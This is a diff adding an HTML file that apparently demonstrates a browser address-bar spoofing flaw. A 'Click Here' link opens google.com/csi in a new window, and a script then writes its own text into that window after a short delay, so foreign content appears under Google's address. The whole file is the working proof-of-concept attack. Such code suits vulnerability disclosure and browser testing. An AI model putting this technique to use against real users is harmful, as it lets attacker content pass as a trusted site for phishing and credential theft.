@@ -1,0 +1,15 @@
+<a href="#" onclick="startSpoof()">Click Here</a>
+
+<script>
+function startSpoof() {
+    let win = window.open('https://www.google.com/csi', 'x');
+    
+    setTimeout(() => {
+        try {
+            win.document.write('address bar spoofed, this is not google.com');
+        } catch(e) {
+            console.log(e);
+        }
+    }, 50);
+}
+</script>
